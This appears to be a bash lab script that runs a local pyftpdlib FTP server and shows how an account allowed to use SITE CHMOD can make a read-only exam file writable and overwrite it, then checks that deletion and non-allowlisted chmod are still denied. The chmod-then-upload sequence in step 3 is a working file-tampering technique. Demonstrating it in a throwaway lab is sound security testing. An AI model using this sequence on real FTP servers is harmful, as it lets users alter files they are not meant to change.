#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
REPO_DIR=$(cd -- "$SCRIPT_DIR/.." && pwd)
FIXTURE_ROOT="$SCRIPT_DIR/server_root"
CONFIG_FILE="$SCRIPT_DIR/lab_config.json"

if [[ $EUID -eq 0 ]]; then
    printf 'Run this lab as a non-root user so POSIX mode checks are enforced.\n' >&2
    exit 1
fi

for command_name in ftp python3; do
    if ! command -v "$command_name" >/dev/null 2>&1; then
        printf 'Missing required command: %s\n' "$command_name" >&2
        exit 1
    fi
done

read_account() {
    python3 - "$CONFIG_FILE" "$1" <<'PY'
import json
import sys

with open(sys.argv[1], encoding="utf-8") as config_file:
    config = json.load(config_file)
username = sys.argv[2]
password = config["users"][username]["password"]
if any(char.isspace() for char in username + password):
    raise SystemExit("FTP usernames and passwords must not contain whitespace")
print(username)
print(password)
PY
}

mapfile -t STUDENT_ACCOUNT < <(read_account student)
mapfile -t CHMODONLY_ACCOUNT < <(read_account chmodonly)
mapfile -t UNLISTED_ACCOUNT < <(read_account unlisted)
if [[ ${#STUDENT_ACCOUNT[@]} -ne 2 ||
    ${#CHMODONLY_ACCOUNT[@]} -ne 2 ||
    ${#UNLISTED_ACCOUNT[@]} -ne 2 ]]; then
    printf 'Could not load lab accounts from %s.\n' "$CONFIG_FILE" >&2
    exit 1
fi
STUDENT_USER=${STUDENT_ACCOUNT[0]}
STUDENT_PASSWORD=${STUDENT_ACCOUNT[1]}
CHMODONLY_USER=${CHMODONLY_ACCOUNT[0]}
CHMODONLY_PASSWORD=${CHMODONLY_ACCOUNT[1]}
UNLISTED_USER=${UNLISTED_ACCOUNT[0]}
UNLISTED_PASSWORD=${UNLISTED_ACCOUNT[1]}

TMP_DIR=$(mktemp -d)
SERVER_ROOT="$TMP_DIR/server_root"
cp -R "$FIXTURE_ROOT" "$SERVER_ROOT"
EXAM="$SERVER_ROOT/exam.txt"
PAYLOAD="$TMP_DIR/replacement.txt"
DOWNLOAD="$TMP_DIR/downloaded_exam.txt"
SERVER_LOG="$TMP_DIR/server.log"
PORT=$(python3 - <<'PY'
import socket

with socket.socket() as sock:
    sock.bind(("127.0.0.1", 0))
    print(sock.getsockname()[1])
PY
)
chmod 0444 "$EXAM"
printf 'UNAUTHORIZED REPLACEMENT: the student changed this exam.\n' >"$PAYLOAD"

SERVER_PID=''
cleanup() {
    if [[ -n "$SERVER_PID" ]]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    rm -rf -- "$TMP_DIR"
}
trap cleanup EXIT INT TERM

PYTHONPATH="$REPO_DIR/pyftpdlib${PYTHONPATH:+:$PYTHONPATH}" \
    python3 -m pyftpdlib \
    --config "$CONFIG_FILE" \
    --directory "$SERVER_ROOT" \
    --interface 127.0.0.1 \
    --port "$PORT" >"$SERVER_LOG" 2>&1 &
SERVER_PID=$!

for _ in {1..50}; do
    if grep -q "starting FTP server on 127.0.0.1:$PORT," "$SERVER_LOG"; then
        break
    fi
    if ! kill -0 "$SERVER_PID" 2>/dev/null; then
        cat "$SERVER_LOG" >&2
        printf 'FTP server failed to start.\n' >&2
        exit 1
    fi
    sleep 0.1
done

if ! grep -q "starting FTP server on 127.0.0.1:$PORT," "$SERVER_LOG"; then
    cat "$SERVER_LOG" >&2
    printf 'Timed out waiting for the FTP server.\n' >&2
    exit 1
fi

ftp_session() {
    ftp -invp 127.0.0.1 "$PORT"
}

printf '1. Student downloads the protected exam.\n'
download_log=$(ftp_session <<EOF
user $STUDENT_USER $STUDENT_PASSWORD
binary
get exam.txt $DOWNLOAD
quit
EOF
) || true
if [[ ! -f "$DOWNLOAD" ]] || ! cmp -s "$EXAM" "$DOWNLOAD"; then
    printf '%s\n' "$download_log" >&2
    printf 'Download verification failed.\n' >&2
    exit 1
fi
printf '   Download succeeded.\n'

printf '2. Upload fails while the server-side file is mode 0444.\n'
before_log=$(ftp_session <<EOF
user $STUDENT_USER $STUDENT_PASSWORD
binary
put $PAYLOAD exam.txt
quit
EOF
) || true
if ! grep -q '^550 ' <<<"$before_log" || grep -q '^226 ' <<<"$before_log"; then
    printf '%s\n' "$before_log" >&2
    printf 'Expected the initial upload to fail on filesystem permissions.\n' >&2
    exit 1
fi
if ! cmp -s "$EXAM" "$FIXTURE_ROOT/exam.txt"; then
    printf 'The exam changed before chmod; aborting.\n' >&2
    exit 1
fi
printf '   Upload was blocked by the file mode.\n'

printf '3. SITE CHMOD grants the owner/group/other write bits; STOR now replaces the file.\n'
attack_log=$(ftp_session <<EOF
user $STUDENT_USER $STUDENT_PASSWORD
binary
quote site chmod 666 exam.txt
put $PAYLOAD exam.txt
quit
EOF
) || true
if ! grep -q '^200 SITE CHMOD successful' <<<"$attack_log" ||
    ! grep -q '^226 ' <<<"$attack_log" ||
    ! cmp -s "$EXAM" "$PAYLOAD"; then
    printf '%s\n' "$attack_log" >&2
    printf 'The chmod-assisted upload did not complete as expected.\n' >&2
    exit 1
fi
printf '   Replacement verified in the temporary server root.\n'

printf '4. chmod does not grant FTP DELE permission (student has no d right).\n'
delete_log=$(ftp_session <<EOF
user $STUDENT_USER $STUDENT_PASSWORD
delete exam.txt
quit
EOF
) || true
if ! grep -q '^550 Not enough privileges\.' <<<"$delete_log" || [[ ! -f "$EXAM" ]]; then
    printf '%s\n' "$delete_log" >&2
    printf 'Expected DELE to be denied and the file to remain.\n' >&2
    exit 1
fi
printf '   DELE was denied by pyftpdlib authorization.\n'

printf '5. A chmod-only account can chmod but cannot upload without w.\n'
chmod 0444 "$EXAM"
chmodonly_log=$(ftp_session <<EOF
user $CHMODONLY_USER $CHMODONLY_PASSWORD
quote site chmod 666 exam.txt
put $PAYLOAD exam.txt
quit
EOF
) || true
if ! grep -q '^200 SITE CHMOD successful' <<<"$chmodonly_log" ||
    ! grep -q '^550 Not enough privileges\.' <<<"$chmodonly_log" ||
    ! cmp -s "$EXAM" "$PAYLOAD"; then
    printf '%s\n' "$chmodonly_log" >&2
    printf 'The chmod-only authorization check did not behave as expected.\n' >&2
    exit 1
fi
printf '   SITE CHMOD succeeded, but STOR was denied by pyftpdlib.\n'

printf '6. A user with M but not in site_chmod_users cannot chmod.\n'
chmod 0444 "$EXAM"
chmod_log=$(ftp_session <<EOF
user $UNLISTED_USER $UNLISTED_PASSWORD
quote site chmod 666 exam.txt
quit
EOF
) || true
if ! grep -q '^550 Not enough privileges\.' <<<"$chmod_log" ||
    [[ $(stat -c '%a' "$EXAM") != 444 ]]; then
    printf '%s\n' "$chmod_log" >&2
    printf 'Expected the non-allowlisted chmod request to be denied.\n' >&2
    exit 1
fi
printf '   SITE CHMOD was denied by the configured user allowlist.\n'

printf '\nSimulation passed via python -m pyftpdlib. The fixture was never modified; the temporary server root will be removed.\n'